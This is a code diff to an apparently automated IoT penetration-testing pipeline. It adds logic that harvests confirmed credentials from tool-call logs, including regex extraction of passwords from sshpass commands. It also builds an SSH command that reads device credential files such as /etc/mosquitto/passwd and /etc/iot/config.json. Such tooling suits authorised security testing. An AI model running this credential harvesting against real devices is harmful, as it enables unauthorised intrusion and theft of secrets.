@@ -6312,8 +6312,8 @@ class Pipeline:
                 user = user or (user_match.group(1) if user_match else "")
             return user, password
 
-        authenticated: dict[tuple[str, str, str], dict] = {}
-        harvested: set[tuple[str, str, str]] = set()
+        authenticated: dict[str, dict] = {}
+        harvested: set[str] = set()
         for line in log_path.read_text(encoding="utf-8").splitlines():
             try:
                 record = json.loads(line)
@@ -6360,7 +6360,7 @@ class Pipeline:
                         "user": user,
                         "password": password,
                     })
-            elif tool == "ssh_exec":
+            elif tool == "ssh_exec" and success:
                 ip = str(args.get("ip") or "").strip()
                 user = str(args.get("user") or "").strip()
                 password = str(args.get("password") or "").strip()
@@ -6368,10 +6368,11 @@ class Pipeline:
                     harvested.add(ip)
 
         command = (
-            "id && hostname && "
+            "id; (hostname 2>/dev/null || true); "
             "for f in /etc/iot/config.json /etc/mosquitto/passwd "
             "/etc/mosquitto/mosquitto.conf; "
-            "do [ -r \"$f\" ] && echo FILE:$f && sed -n '1,80p' \"$f\"; done"
+            "do if [ -r \"$f\" ]; then echo FILE:$f; "
+            "sed -n '1,80p' \"$f\"; fi; done"
         )
         executed = 0
         for key, session in sorted(authenticated.items()):
@@ -7106,6 +7107,19 @@ class Pipeline:
                            "uid", "gid", "groups", "host", "tor", "mosquitto", "server"}
             seen_creds: set = set()
 
+            tool_records_by_ref: dict[str, list[dict]] = {}
+            if self._uses_compact_local_moe():
+                tool_log_path = self.run_dir / "tool_calls.jsonl"
+                if tool_log_path.exists():
+                    for line in tool_log_path.read_text(encoding="utf-8").splitlines():
+                        try:
+                            record = json.loads(line)
+                        except (TypeError, ValueError, json.JSONDecodeError):
+                            continue
+                        ref = str(record.get("evidence_ref") or "").strip()
+                        if ref:
+                            tool_records_by_ref.setdefault(ref, []).append(record)
+
             def _add_cred(user: str, pwd: str, exp: dict) -> None:
                 user = user.split("@")[0].strip()  # user@host → user
                 key = (user, pwd, exp.get("device_ip", ""))
@@ -7129,6 +7143,54 @@ class Pipeline:
                         continue
                     _add_cred(user, pwd, exp)
 
+            def _harvest_confirmed_tool_credentials(exp: dict) -> None:
+                if not tool_records_by_ref:
+                    return
+                refs = exp.get("evidence_refs", [])
+                refs = [refs] if isinstance(refs, str) else (refs or [])
+                for ref in refs:
+                    for record in tool_records_by_ref.get(str(ref), []):
+                        tool = str(record.get("tool") or "")
+                        args = record.get("args") or {}
+                        if not isinstance(args, dict):
+                            continue
+                        raw_result = record.get("result")
+                        try:
+                            result = json.loads(raw_result) if isinstance(raw_result, str) else raw_result
+                        except (TypeError, ValueError, json.JSONDecodeError):
+                            continue
+                        if not isinstance(result, dict):
+                            continue
+                        stdout = str(result.get("stdout") or result.get("output") or "")
+                        success = (
+                            result.get("success") is True
+                            and result.get("authenticated", True) is not False
+                        ) or (
+                            result.get("return_code") == 0
+                        ) or (
+                            tool == "ssh_login"
+                            and bool(_re.search(r"\buid=\d+", stdout))
+                        )
+                        if not success:
+                            continue
+                        if tool == "try_credential":
+                            _add_cred(
+                                str(args.get("user") or ""),
+                                str(args.get("password") or ""),
+                                exp,
+                            )
+                            continue
+                        if tool != "ssh_login":
+                            continue
+                        command = str(args.get("command_string") or "")
+                        match = _re.search(
+                            r"sshpass\s+-p\s+(?:'([^']*)'|\"([^\"]*)\"|([^\s]+)).*?\b([A-Za-z0-9_.-]+)@(?:\d{1,3}\.){3}\d{1,3}\b",
+                            command,
+                        )
+                        if match:
+                            password = next((group for group in match.groups()[:3] if group), "")
+                            _add_cred(match.group(4), password, exp)
+
             for exp in confirmed:
                 texts = [exp.get("evidence", "")]
                 # Descriptions may contain examples or hints, not recovered secrets.
@@ -7141,10 +7203,11 @@ class Pipeline:
                     texts.append(de)
                 for text in texts:
                     _harvest(text or "", exp)
+                _harvest_confirmed_tool_credentials(exp)
 
-            # Entry points = devices with a confirmed exploit (proven footholds).
-            # Prefer access-granting vuln types; fall back to any confirmed exploit.
-            # (Scenario-mode nodes have no network_role, so we derive from Phase 4.)
+            # Entry points require a confirmed access-granting exploit. Informational
+            # findings and crypto warnings are findings, not usable footholds.
+            # (Scenario-mode nodes have no network_role, so derive from Phase 4.)
             _foothold_types = {
                 "default_credentials", "no_auth", "weak_credentials",
                 "insecure_protocol", "directory_listing", "data_exposure",
@@ -7155,7 +7218,12 @@ class Pipeline:
                 if not ip:
                     continue
                 vt = (exp.get("type") or exp.get("vuln_type") or "").lower()
-                score = (2 if vt in _foothold_types else 1, exp.get("evidence_level", 0))
+                if vt not in _foothold_types:
+                    if self._uses_compact_local_moe():
+                        continue
+                    score = (1, exp.get("evidence_level", 0))
+                else:
+                    score = (2, exp.get("evidence_level", 0))
                 if ip not in best_by_ip or score > best_by_ip[ip][0]:
                     best_by_ip[ip] = (score, exp)
             for ip, (_score, exp) in best_by_ip.items():
